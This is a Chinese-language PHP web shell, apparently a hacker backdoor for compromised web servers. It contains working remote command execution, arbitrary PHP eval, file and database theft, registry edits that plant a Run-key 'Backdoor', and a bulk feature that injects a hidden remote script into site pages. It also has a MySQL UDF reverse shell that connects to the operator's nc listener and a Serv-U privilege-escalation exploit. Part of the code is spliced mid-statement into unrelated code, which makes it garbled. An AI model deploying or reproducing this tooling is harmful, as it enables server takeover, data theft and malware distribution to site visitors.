<?php
error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
$admin['pass']  = "1";  
$admin['check'] = "1";

$retime = "yes";

$cmd = "cmd.exe";

$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');

if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];
$dis_func = get_cfg_var("disable_functions");


if($admin['check'] == "1") {
	if ($_GET['action'] == "logout") {
		setcookie ("adminpass", "");
		echo "<meta http-equiv=\"refresh\" content=\"0;URL=".$self."\">";
		exit;
	}

	if ($_POST['do'] == 'login') {
		$thepass=trim($_POST['adminpass']);
		if ($admin['pass'] == $thepass) {
			setcookie ("adminpass",$thepass,time()+(1*24*3600));
			echo "<meta http-equiv=\"refresh\" content=\"0;URL=".$self."\">";
			exit;
		}
	}
	if (isset($_COOKIE['adminpass'])) {
		if ($_COOKIE['adminpass'] != $admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== 验证结束 =====================*/

// 判断 magic_quotes_gpc 状态
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

// 查看PHPINFO
if ($_GET['action'] == "phpinfo") {
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() 函数已被禁用,请查看&lt;PHP环境变量&gt;";
	exit;
}
if($_GET['action'] == "nowuser") {
$user = get_current_user();
if(!$user) $user = "报告长官，主机变态，无法获取当前进行用户名！";
echo"当前进程用户名：$user";
exit;
}
if(isset($_POST['phpcode'])){
	eval("?".">$_POST[phpcode]<?");
	exit;
}
// 在线代理
if (isset($_POST['url'])) {
	$proxycontents = @file_get_contents($_POST['url']);
	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>";
	exit;
}

// 下载文件
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('你要下的文件不存在!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}

// 直接下载备份数据库
if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
	@mysql_select_db($dbname) or die("选择数据库失败");	
	$table = array_flip($_POST['table']);
	$result = mysql_query("SHOW tables");
	echo ($result) ? NULL : "出错: ".mysql_error();

	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata.= sqldumptable($currow[0]);
			$mysqldata.= $mysqldata."\r\n";
		}
	}
	mysql_close();
	exit;
}

// 程序目录
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// 获取当前路径
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// 判断读写情况
$dir_writeable = (dir_writeable($nowpath)) ? "可写" : "不可写";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">注册表操作</a>" : "";

$tb = new FORMS;

?><?php

$test = "";
if(!$_GET['dir']) $dir = "./";
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b></b></td><td align="center">'.date("Y年m月d日 h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody('<a href="?action=dir">SHELL目录</a> | <a href="?action=downloads">Http 文件下载</a> | <a href="?action=phpenv">环境变量</a> | <a href="?action=proxy">在线代理</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | <a href="?action=logout">注销登录</a> ');
$tb->tdbody(' <a href="?action=plgm">批量挂马</a> | <a href="?action=search&dir='.$dir.'">文件查找</a> | <a href="?action=eval">执行php脚本</a> | <a href="?action=sql">执行SQL语句</a> | <a href="?action=sql&type=fun">Func反弹Shell</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="?action=SUExp">Serv-U EXP</a> | <a href="?action=adodb">ADODB</a> ');
$tb->tdbody(' 目录列表：<a href="?dir=c:\">C盘</a> | <a href="?dir=d:\">D盘</a> | <a href="?dir=e:\">E盘</a> | <a href="?dir=f:\">F盘</a> | <a href="?dir=g:\">G盘</a> | <a href="?dir=C:\Program Files">程序</a> | <a href="?dir=C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere">pcAnywhere</a> ');
$tb->tablefooter();
?><?php
/*===================== 执行操作 开始 =====================*/
echo "<p><b>\n";
// 删除文件
if (!empty($delfile)) {
	if (file_exists($delfile)) {
		echo (@unlink($delfile)) ? $delfile." 删除成功!" : "文件删除失败!";
	} else {
		echo basename($delfile)." 文件已不存在!";
	}
}

// 删除目录
elseif (!empty($deldir)) {
	$deldirs="$dir/$deldir";
	if (!file_exists("$deldirs")) {
		echo "$deldir 目录已不存在!";
	} else {
		echo (deltree($deldirs)) ? "目录删除成功!" : "目录删除失败!";
	}
}
// 创建目录
elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) {
			echo "该目录已存在!";
		} else {
			echo (@mkdir("$mkdirs",0777)) ? "创建目录成功!" : "创建失败!";
			@chmod("$mkdirs",0777);
		}
	}
}

// 上传文件
elseif ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "上传成功!" : "上传失败!";
}

// 编辑文件
elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
    if(!file_exists($editfilename)) unset($retime);
	if($time==$now) $time = @filemtime($editfilename);
        $time2 = @date("Y-m-d H:i:s",$time);
		$filename="$editfilename";
		@$fp=fopen("$filename","w");
		if($_POST['change']=="yes"){
		$filecontent = "?".">".$_POST['filecontent']."<?";
		$filecontent = gzdeflate($filecontent);
        $filecontent = base64_encode($filecontent);
        $filecontent = "<?php\n/*\n代码由加密!\n*/\neval(gzinflate(base64_decode('$filecontent')));\n"."?><?php
// 目录列表
$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap>| <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','你确定要删除 $file 目录吗? \\n\\n如果该目录非空,此次操作将会删除该目录下的所有文件!','1')\">删除</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($file)."\">改名</a> |</td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">返回上级目录</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}// while
@closedir($dirs); 
?><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} elseif ($execfunc=="wscript") {
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif($execfunc=="proc_open"){
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
if (is_resource($process)) {

    // 写命令
    fwrite($pipes[0], "".$_POST['command']."\r\n");
    fwrite($pipes[0], "exit\r\n");
    fclose($pipes[0]);
    // 读取输出
    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    while (!feof($pipes[2])) {
        echo fgets($pipes[2], 1024);
      }
    fclose($pipes[2]);

    proc_close($process);
}
		} else {
			system($_POST['command']);
		}
	}
	?><?php
}//end shell

elseif ($_GET['action'] == "reg") {
	$action = '?action=reg';
	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
	$delregname = $_POST['delregname'];
	$tb->tableheader();
	$tb->formheader($action,'读取注册表');
	$tb->tdbody('键值: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','读取','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'写入注册表');
	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
	$tb->tdbody('键值: '.$tb->makeinput('writeregname',$registre,'','text','56').' 类型: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' 值:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','写入','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'删除注册表');
	$tb->tdbody('键值: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','删除','','submit'),'center','2','50');
	echo "</form>";
	$tb->tablefooter();
}//end reg
elseif ($_GET['action'] == "downloads"){
$action = '?action=dir';
	$tb->tableheader();
	$tb->formheader($action,'http文件下载模式');
	$tb->tdbody('你可以使用本功能把一些小工具以http方式下载到此服务器','center');
	$tb->tdbody('文件位置: '.$tb->makeinput('durl','http://blog.blackwoods.com/miyabi/myshell.txt','','text','70').'<br>下载到:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','下载','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('注意,假设文件太大将无法下载下来而且影响执行速度.','center');
	$tb->tablefooter();
}
elseif ($_GET['action'] == "search"){
$action = '?dir='.$dir.'';
	$tb->tableheader();
	$tb->formheader($action,'文件查找');
	$tb->tdbody('你可以使用本功能查找一个目录下的文件里哪写文件包含着关键词!','center');
	$tb->tdbody('文件位置: '.$tb->makeinput('path',''.$nowpath.'','','text','70').'<br>查找文字:'.$tb->makeinput('oldkey','下贱','','text','60').''.$tb->makehidden('do','search').'<br> 是否计算所在行<input type="checkbox" name="type" value="list" onclick="javascript:alert(\'选定此处将会列出关键词在所在文件的多少行,和所在的那文件有多少行进行比对\\n\\n格式为:[所在行/文件总行]例如[12/99],用来进行分析.\\n\\n此功能可能会增加一部分的延时,请考虑使用,没有可读权限将出错!\')"> (此功能和下面一个功能会影响执行速度，所以默认关闭!) <br>适当读取:<input type="checkbox" name="type2" value="getpath" onclick="javascript:alert(\'选定此处将会列出关键词在所在位置及你设定结束区域内的部分字符..\\n\\n采取此功能查找完文件后把鼠标移动到找到的文件名上即可读取分析....\\n\\n此功能可能会增加一部分的延时,请考虑使用,没有可读权限将出错!\')"> 读取关键词前'.$tb->makeinput('beline','0','','text','3').'个字符 '.$tb->makehidden('dir',''.$dir.'').'到关键词后第'.$tb->makeinput('endline','10','','text','3').'个字符... '.$tb->makehidden('dir',''.$dir.'').''.$tb->makeinput('','开始查找文件','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('请表太大的目录了，慢慢浏览慢慢找好不好嘛.假设选定计算行速度会慢。显示[所在行/总共多少行]','center');
	$tb->tablefooter();
}
elseif ($_GET['action'] == "plgm") {
	$action = '?action=plgmok';
	$gm = "<iframe  width=0 height=0></iframe>";
	$gmm = base64_decode('PHNjcmlwdCBzcmM9aHR0cDovLyU3NiU2MyU2MyU2NCUyRSU2MyU2RS8lMzI+PC9zY3JpcHQ+');
	$tb->tableheader();
	$tb->formheader($action,'批量挂马');
	$tb->tdbody('文件位置: '.$tb->makeinput('dir',''.$nowpath.'','','text','60').$tb->makehidden('sbbm',''.$gmm.'','','text').'<br>要挂代码:'.$tb->maketextarea('mm',$gm,'50','5').''.$tb->makehidden('do','批量挂马').'<br>'.$tb->makeinput('submit','开始挂马','','submit'),'center','1','35');
	$tb->tablefooter();
}//end proxy
elseif ($_GET['action'] == "proxy") {
	$action = '?action=proxy';
	$tb->tableheader();
	$tb->formheader($action,'在线代理','proxyframe');
	$tb->tdbody('<br><ul><li>用本功能仅实现简单的 HTTP 代理,不会显示使用相对路径的图片、链接及CSS样式表.</li><li>用本功能可以通过本服务器浏览目标URL,但不支持 SQL Injection 探测以及某些特殊字符.</li><li>用本功能浏览的 URL,在目标主机上留下的IP记录是 : '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');
	$tb->tdbody('URL: '.$tb->makeinput('url','http://www.google.com','','text','100').' '.$tb->makeinput('','浏览','','submit'),'center','1','40');
	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://www.google.com"></iframe>');
	echo "</form>";
	$tb->tablefooter();
}//end proxy

elseif ($_GET['action'] == "sql") {
	$action = '?action=sql';

	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$sql_query = $_POST['sql_query'];
if($type=="fun"){
$sql_query = "CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\Winnt\\\Mix.dll';
select Mixconnect('".$_SERVER['REMOTE_ADDR']."','8888');/*这个最好先执行了上面一句再用*/
/*请在你计算机上执行 nc -vv -l -p 8888*/";
}
	$tb->tableheader();
	$tb->formheader($action,'执行 SQL 语句');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','连接','','submit'));
	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
	$tb->makehidden('do','query');
	$tb->formfooter('1','30');
}//end sql query

elseif ($_GET['action'] == "sqlbak") {
	$action = '?action=sqlbak';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$tb->tableheader();
	$tb->formheader($action,'备份 MySQL 数据库');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','连接','','submit'));
	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
    $tables = @mysql_list_tables($dbname);
    while ($table = @mysql_fetch_row($tables)) {
		$cachetables[$table[0]] = $table[0];
    }
    @mysql_free_result($tables);
	if (empty($cachetables)) {
		$tb->tdbody('<b>您没有连接数据库 or 当前数据库没有任何数据表</b>');
	} else {
		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">请选择表:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> 备份数据所保存的路径:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> 直接下载到本地 (适合数据量较小的数据库)</td></tr></table>');
		$tb->makehidden('do','backupmysql');
		$tb->formfooter('0','30');
	}
	$tb->tablefooter();
	@mysql_close();
}//end sql backup

elseif ($_GET['action'] == "phpenv") {
	$user = " <a href=\"?action=nowuser\" target=\"_blank\">以免crush点此获取当前进程用户名</a> ";
	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
		$info = array(
		    0 => array("当前php进程用户",$user),
			1 => array("服务器操作系统",PHP_OS),
			2 => array("服务器时间",date("Y年m月d日 h:i:s",time())),
			3 => array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
			4 => array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])),
			5 => array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
			6 => array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
			7 => array("Web服务端口",$_SERVER['SERVER_PORT']),
			8 => array("PHP运行方式",strtoupper(php_sapi_name())),
			9 => array("PHP版本",PHP_VERSION),
			10 => array("运行于安全模式",getphpcfg("safemode")),
			11 => array("服务器管理员",$adminmail),
			12 => array("本文件路径",__FILE__),
            13 => array("允许使用 URL 打开文件 allow_url_fopen",getphpcfg("allow_url_fopen")),
			14 => array("允许动态加载链接库 enable_dl",getphpcfg("enable_dl")),
			15 => array("显示错误信息 display_errors",getphpcfg("display_errors")),
			16 => array("自动定义全局变量 register_globals",getphpcfg("register_globals")),
			17 => array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc")),
			18 => array("程序最多允许使用内存量 memory_limit",getphpcfg("memory_limit")),
			19 => array("POST最大字节数 post_max_size",getphpcfg("post_max_size")),
			20 => array("允许最大上传文件 upload_max_filesize",$upsize),
			21 => array("程序最长运行时间 max_execution_time",getphpcfg("max_execution_time")."秒"),
			22 => array("被禁用的函数 disable_functions",$dis_func),
			23 => array("phpinfo()",$phpinfo),
			24 => array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
            25 => array("图形处理 GD Library",getfun("imageline")),
			26 => array("IMAP电子邮件系统",getfun("imap_close")),
			27 => array("MySQL数据库",getfun("mysql_close")),
			28 => array("SyBase数据库",getfun("sybase_close")),
			29 => array("Oracle数据库",getfun("ora_close")),
			30 => array("Oracle 8 数据库",getfun("OCILogOff")),
			31 => array("PREL相容语法 PCRE",getfun("preg_match")),
			32 => array("PDF文档支持",getfun("pdf_close")),
			33 => array("Postgre SQL数据库",getfun("pg_close")),
			34 => array("SNMP网络管理协议",getfun("snmpget")),
			35 => array("压缩文件支持(Zlib)",getfun("gzclose")),
			36 => array("XML解析",getfun("xml_set_object")),
			37 => array("FTP",getfun("ftp_login")),
			38 => array("ODBC数据库连接",getfun("odbc_close")),
			39 => array("Session支持",getfun("session_start")),
			40 => array("Socket支持",getfun("fsockopen")),
		); 
	$tb->tableheader();
	echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
	$tb->tdbody('<b>查看PHP配置参数状况</b>','left','1','30','style="padding-left: 5px;"');
	$tb->tdbody('请输入配置参数(如:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','查看','','submit'),'left','2','30','style="padding-left: 5px;"');
	$tb->makehidden('do','viewphpvar');
	echo "</form>\n";
	$hp = array(0=> '服务器特性', 1=> 'PHP基本特性', 2=> '组件支持状况');
	for ($a=0;$a<3;$a++) {
		$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
?><?php
		if ($a==0) {
			for($i=0;$i<=12;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 1) {
			for ($i=13;$i<=24;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 2) {
			for ($i=25;$i<=40;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}
?><?php
	}//for
echo "</table>";
}//end phpenv
elseif($_GET['action'] == "SUExp")
{
    if($_POST['SUPort'] != "" && $_POST['SUUser'] != "" && $_POST['SUPass'] != "" && $_POST['SUCommand'])
    {
        echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\"><tr class=\"firstalt\"><td align=\"left\">";
        $sendbuf = "";
        $recvbuf = "";
        $domain  = "-SETDOMAIN\r\n".
                "-Domain=haxorcitos|0.0.0.0|2121|-1|1|0\r\n".
                "-TZOEnable=0\r\n".
                " TZOKey=\r\n";
        $adduser = "-SETUSERSETUP\r\n".
                "-IP=0.0.0.0\r\n".
                "-PortNo=2121\r\n".
                "-User=Will_Be\r\n".
                "-Password=Will_Be\r\n".
                "-HomeDir=c:\\\r\n".
                "-LoginMesFile=\r\n".
                "-Disable=0\r\n".
                "-RelPaths=1\r\n".
                "-NeedSecure=0\r\n".
                "-HideHidden=0\r\n".
                "-AlwaysAllowLogin=0\r\n".
                "-ChangePassword=0\r\n".
                "-QuotaEnable=0\r\n".
                "-MaxUsersLoginPerIP=-1\r\n".
                "-SpeedLimitUp=0\r\n".
                "-SpeedLimitDown=0\r\n".
                "-MaxNrUsers=-1\r\n".
                "-IdleTimeOut=600\r\n".
                "-SessionTimeOut=-1\r\n".
                "-Expire=0\r\n".
                "-RatioUp=1\r\n".
                "-RatioDown=1\r\n".
                "-RatiosCredit=0\r\n".
                "-QuotaCurrent=0\r\n".
                "-QuotaMaximum=0\r\n".
                "-Maintenance=None\r\n".
                "-PasswordType=Regular\r\n".
                "-Ratios=None\r\n".
                " Access=c:\\|RELP\r\n";
        $deldomain="-DELETEDOMAIN\r\n".
                     "-IP=0.0.0.0\r\n".
                     " PortNo=2121\r\n";
        $sock = fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "USER ".$_POST["SUUser"]."\r\n";
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "SITE MAINTENANCE\r\n";
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = $domain;
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = $adduser;
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        echo "**********************************************************<br>";
        echo "Starting Exploit ...<br>";
        echo "**********************************************************<br>";
        $exp = fsockopen("127.0.0.1", "2121", &$errno, &$errstr, 10);
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "USER Will_Be\r\n";
        fputs($exp, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "PASS Will_Be\r\n";
        fputs($exp, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
        fputs($exp, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        echo "**********************************************************<br>";
        echo "Starting Delete Domain ...<br>";
        echo "**********************************************************<br>";
        $sendbuf = $deldomain;
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        echo "</td></tr></table>";
        fclose($sock);
        fclose($exp);
    }
?><?php
}
?><?php
	debuginfo();
	ob_end_flush();	
	?><?php

/*======================================================
函数库
======================================================*/

	// 登陆入口
	function loginpage() {
?><?php
		exit;
	}//end loginpage()

	// 页面调试信息
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// 去掉转义字符
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// 删除目录
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		return (@rmdir($deldir)) ? 1 : 0;
	} 

	// 判断读写情况
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// 表格行间的背景色替换
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// 获取当前的文件系统路径
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}
function dirtree($path,$mm)
 { 
	$d =@dir("$path");
	while (false !== ($entry = $d->read())) {
		if($entry == "." || $entry == "..") continue;
